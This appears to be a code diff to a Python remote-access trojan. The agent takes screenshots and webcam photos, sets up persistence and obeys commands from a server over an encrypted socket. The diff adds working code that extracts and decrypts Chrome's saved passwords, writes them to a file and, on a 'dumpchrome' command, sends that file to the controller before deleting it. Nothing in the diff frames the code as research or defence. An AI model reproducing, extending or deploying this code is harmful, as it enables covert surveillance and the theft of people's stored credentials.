@@ -10,6 +10,9 @@ import io
 import mss
 import cv2
 import sys
+import shutil
+import sqlite3
+import win32crypt
 from PIL import Image
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -31,29 +34,6 @@ def decrypt_message(encrypted_message: bytes) -> str:
     cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
     return unpad(cipher.decrypt(encrypted), AES.block_size).decode()
 
-def send_packet(sock, message: str):
-    encrypted = encrypt_message(message)
-    size = str(len(encrypted)).zfill(10).encode()
-    sock.send(size + encrypted)
-
-def recv_packet(sock):
-    size_data = b""
-    while len(size_data) < 10:
-        part = sock.recv(10 - len(size_data))
-        if not part:
-            return None
-        size_data += part
-    size = int(size_data.decode().strip())
-
-    data = b""
-    while len(data) < size:
-        part = sock.recv(size - len(data))
-        if not part:
-            break
-        data += part
-
-    return decrypt_message(data)
-
 def take_screenshot():
     with mss.mss() as sct:
         screenshot = sct.grab(sct.monitors[1])
@@ -69,7 +49,8 @@ def list_webcams():
         if cap.read()[0]:
             available.append(i)
         cap.release()
-    return ",".join(str(i) for i in available) if available else "None"
+        
+    return "Camera(s) available index: " + ",".join(str(i) for i in available) if available else "No camera(s) available"
 
 def take_photo(index):
     try:
@@ -135,7 +116,66 @@ def upload_file(data, name):
         return True
     except:
         return False
-        
+    
+def get_master_key():
+    local_state_path = os.path.join(
+        os.environ['USERPROFILE'],
+        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
+    )
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]
+    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return master_key
+
+def decrypt_value(buff, master_key):
+    try:
+        if buff is None:
+            return ""
+        if len(buff) == 0:
+            return ""
+        if buff.startswith(b'v10') or buff.startswith(b'v11'):
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)[:-16]
+            return decrypted.decode('utf-8', errors='ignore')
+        else:
+            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+    except Exception as e:
+        return ""
+
+def extract__chrome_passwords():
+    try:
+        master_key = get_master_key()
+        login_db_path = os.path.join(
+            os.environ['USERPROFILE'],
+            "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
+        )
+        tmp_path = os.path.join(os.environ["TEMP"], "Loginvault.db")
+        shutil.copyfile(login_db_path, tmp_path)
+
+        conn = sqlite3.connect(tmp_path)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            url, username, encrypted_password = row
+            if username or encrypted_password:
+                decrypted_password = decrypt_value(encrypted_password, master_key)
+                with open("passwords.txt", "a") as f:
+                    f.write("-" * 50 + "\n")
+                    f.write(f"URL: {url}\n")
+                    f.write(f"Username: {username}\n")
+                    f.write(f"Password: {decrypted_password}\n\n")
+        cursor.close()
+        conn.close()
+        os.remove(tmp_path)
+        return True
+    except Exception as e:
+        return False
+
 def Persist():
     script_path = sys.executable
 
@@ -214,7 +254,6 @@ def handle_server(sock, agent_id):
                 else:
                     send_json(sock, "photo", agent_id, photo)
 
-
             elif cmd_type == "video":
                 args = payload.split()
                 index = int(args[0])
@@ -245,11 +284,45 @@ def handle_server(sock, agent_id):
                     msg = f"❌ Upload failed: {e}"
                 send_json(sock, "response", agent_id, msg)
 
+            elif cmd_type == "dumpchrome":
+                if extract__chrome_passwords():
+                    file_data = download_file("passwords.txt")
+                    if file_data:
+                        send_json(sock, "file", agent_id, f"{file_data}|passwords.txt")
+                        os.remove("passwords.txt")
+                    else:
+                        send_json(sock, "response", agent_id, "[!] Failed to read passwords file")
+                else:
+                    send_json(sock, "response", agent_id, "[!] Failed to extract passwords")
+
             elif cmd_type == "kill":
                 return True
 
         except Exception as e:
             break
+
+def send_packet(sock, message: str):
+    encrypted = encrypt_message(message)
+    size = str(len(encrypted)).zfill(10).encode() 
+    sock.send(size + encrypted)
+
+def recv_packet(sock):
+    size_data = b""
+    while len(size_data) < 10:
+        part = sock.recv(10 - len(size_data))
+        if not part:
+            return None
+        size_data += part
+    size = int(size_data.decode().strip())
+
+    data = b""
+    while len(data) < size:
+        part = sock.recv(size - len(data))
+        if not part:
+            break
+        data += part
+
+    return decrypt_message(data)
 
 def send_json(sock, type_, agent_id, data):
     msg = json.dumps({
